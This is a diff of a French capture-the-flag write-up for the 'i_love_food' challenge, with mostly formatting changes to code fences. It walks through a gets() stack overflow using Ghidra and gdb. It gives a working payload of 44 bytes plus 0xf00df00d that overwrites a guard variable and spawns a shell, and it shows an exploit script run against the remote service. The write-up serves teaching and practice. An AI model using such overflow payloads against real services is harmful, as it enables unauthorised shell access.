@@ -10,7 +10,7 @@ http://internetcest.fun:13338
 
 [Cet exécutable](./i_love_food) est fournis. Essayons le :
 
-```console
+```bash
 $ ./i_love_food 
 What is your favorite dish ? 
 test
@@ -25,17 +25,13 @@ Avec ghidra on obtient le code suivant :
 
 ```C
 undefined8 main(void)
-
 {
   setup();
   vuln();
   return 0;
 }
-```
 
-```C
 void vuln(void)
-
 {
   char local_38 [44];
   uint local_c;
@@ -62,10 +58,7 @@ La fonction gets() utilisé pour récupérer l'entrée de l'utilisateur étant v
 
 Utilisons gdb pour trouver notre payload :
 
-```console
-$ gdb i_love_food -q   
-Reading symbols from i_love_food...
-(No debugging symbols found in i_love_food)
+```gdb
 (gdb) disas vuln
 Dump of assembler code for function vuln:
    0x0000000000001194 <+0>:	push   %rbp
@@ -117,7 +110,7 @@ Breakpoint 1, 0x00005555555551c3 in vuln ()
 
 On lance gdb, ajoute un break après l'appel de la fonction gets, et rentre 44 charactères A pour remplir le buffer utilisé pour stocker l'entrée de l'utilisateur. En observant la stack on voit que la variable local_c contenant `deadbeef` est stocké directement après. Essayons de la modifier :
 
-```console
+```gdb
 (gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")')
 Starting program: /home/coucou/Documents/I_love_food/i_love_food <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")')
 [Thread debugging using libthread_db enabled]
@@ -142,7 +135,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 On arrive bien au message de succès. Testons le payload directement sur l'executable :
 
-```console
+```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee) | ./i_love_food  
 What is your favorite dish ? 
 
@@ -159,7 +152,7 @@ Le programme lance bien /bin/sh, le payload final est donc `"\x41"*44+"\x0d\xf0\
 
 Il faut maintenant se connecter au service et envoyer le payload. On utilise donc [ce script python](./exploit.py) qui permet de ce connecter au serveur, envoyer le payload, puis d'interagir avec le shell pour obtenir le flag :
 
-```console
+```bash
 $ python3 exploit.py                                                                              
 b"What is your favorite dish ? \nDamn that's a good one !\n"
 whoami
